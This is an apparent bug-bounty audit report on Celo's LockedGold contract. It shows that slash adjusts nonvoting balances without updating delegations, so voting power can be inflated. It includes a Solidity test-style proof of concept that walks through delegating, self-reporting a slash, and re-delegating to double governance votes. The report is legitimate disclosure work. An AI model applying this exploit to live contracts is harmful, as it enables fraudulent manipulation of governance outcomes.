# #37251 \[SC-Critical] Fraudulent padding of governance voting power

**Submitted on Nov 30th 2024 at 02:15:23 UTC by @innertia for** [**Audit Comp | Celo**](https://immunefi.com/audit-competition/audit-comp-celo)

* **Report ID:** #37251
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/celo-org/celo-monorepo/blob/release/core-contracts/12/packages/protocol/contracts/governance/LockedGold.sol>
* **Impacts:**
  * Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

`Slash` reduces or increases a user's `nonvoting balance`. However, there is no processing related to `delegete`.\
This can cause various vulnerabilities, but this report will introduce the fraudulent inflation of voting rights by attackers.

## Vulnerability Details

The `slash` function increases or decreases the `nonvotingBalance` of the target account or reporter. However, if a delegation has occurred beforehand, the increase or decrease of the delegation amount must also be calculated.

```
      _decrementNonvotingAccountBalance(account, maxSlash.sub(difference));
      _incrementNonvotingAccountBalance(reporter, reward);
```

<https://github.com/celo-org/celo-monorepo/blob/3c58a09455a12518916d2df38693325bafeb462b/packages/protocol/contracts/governance/LockedGold.sol#L505-L506>

For example, if you look at the `lock` function, which is another process that increases `nonvotingBalance`, you can see that it also updates `DelegatedAmount`.

```
    _incrementNonvotingAccountBalance(msg.sender, msg.value);
    _updateDelegatedAmount(msg.sender);
```

<https://github.com/celo-org/celo-monorepo/blob/3c58a09455a12518916d2df38693325bafeb462b/packages/protocol/contracts/governance/LockedGold.sol#L150-L151>

`slash` does not do this, so there is no consistency between the increase/decrease in `nonvotingBalance` and `DelegatedAmount`. This can lead to various attack methods and calculation errors, but I would like to introduce one example, which is inflating the number of voting rights.

I will explain the step-by-step process while implementing it within the POC.

## Impact Details

* Inflating the number of votes
* Withdrawing tokens while maintaining the number of votes etc.

## References

<https://github.com/celo-org/celo-monorepo/blob/3c58a09455a12518916d2df38693325bafeb462b/packages/protocol/contracts/governance/LockedGold.sol#L505-L506.\\>
<https://github.com/celo-org/celo-monorepo/blob/3c58a09455a12518916d2df38693325bafeb462b/packages/protocol/contracts/governance/LockedGold.sol#L150-L151>

## Proof of Concept

## 3. Proof of Concept

Please add the following `test_GovernanceVotingPowerFraudulentlyInflated` function to the `LockedGoldTest_slash` contract in `LockedGold.t.sol`. <https://github.com/celo-org/celo-monorepo/blob/release/core-contracts/12/packages/protocol/test-sol/unit/governance/voting/LockedGold.t.sol.\\>
<https://github.com/celo-org/celo-monorepo/blob/3c58a09455a12518916d2df38693325bafeb462b/packages/protocol/test-sol/unit/governance/voting/LockedGold.t.sol#L1096C10-L1096C30>

```
function test_GovernanceVotingPowerFraudulentlyInflated() public {
//attackerMain: account that gathers voting power
address attackerMain = actor("attackerMain");
address attackerMainSigner;
uint256 attackerMainSignerPK;

//attackerSub: A decoy account
address attackerSub = actor("attackerSub");
address attackerSubSigner;
uint256 attackerSubSignerPK;

uint256 percentToDelegate = 100;
uint256 delegatedAmount = (value * percentToDelegate) / 100;

vm.prank(attackerMain);
accounts.createAccount();
vm.prank(attackerSub);
accounts.createAccount();
(attackerMainSigner, attackerMainSignerPK) = actorWithPK("attackerMainSigner");
(attackerSubSigner, attackerSubSignerPK) = actorWithPK("attackerSubSigner");

vm.deal(attackerSub, 10 ether);

//Lock celo by attackersub
lockCelo(attackerSub, value);

//100% delegation from attackerSub to attackerMain
delegateCelo(attackerSub, attackerMain, 100);

//By delegation,all of the VotingPower has been given to attackerMain.
assertEq(lockedGold.getAccountTotalGovernanceVotingPower(attackerSub), 0);
assertEq(lockedGold.getAccountTotalGovernanceVotingPower(attackerMain), value);

//The attackerSub carries out an act that deserves a slash, and reports it to the Slasher.
//The important thing is that this reporter is also an account related to the attacker.
uint256 penalty = value;
uint256 reward = value;
address[] memory lessers = new address[](1);
lessers[0] = address(0);
address[] memory greaters = new address[](1);
greaters[0] = address(0);
uint256[] memory indices = new uint256[](1);
indices[0] = 0;

vm.prank(downtimeSlasher);
lockedGold.slash(attackerSub, penalty, reporter, reward, lessers, greaters, indices);

//reward is given to the reporter
assertEq(lockedGold.getAccountNonvotingLockedGold(reporter), reward);

//The reporter (the attacker's related account) who received the reward delegates this to attackerMain
delegateCelo(reporter, attackerMain, 100);

//The attackerMain has GovernanceVotingPower that has been fraudulently inflated.
//In this sequence, the locked celo is only the `value`. In other words, GovernanceVotingPower should only exist for the `value`.
//However, by taking advantage of the flawed implementation of `slash`, GovernanceVotingPower can be padded to the value + reward (in this example, it is doubled).
//This is a manipulation of voting rights, and is a significant damage to the protocol.
assertEq(lockedGold.getAccountTotalGovernanceVotingPower(attackerMain), value + reward);

}
```
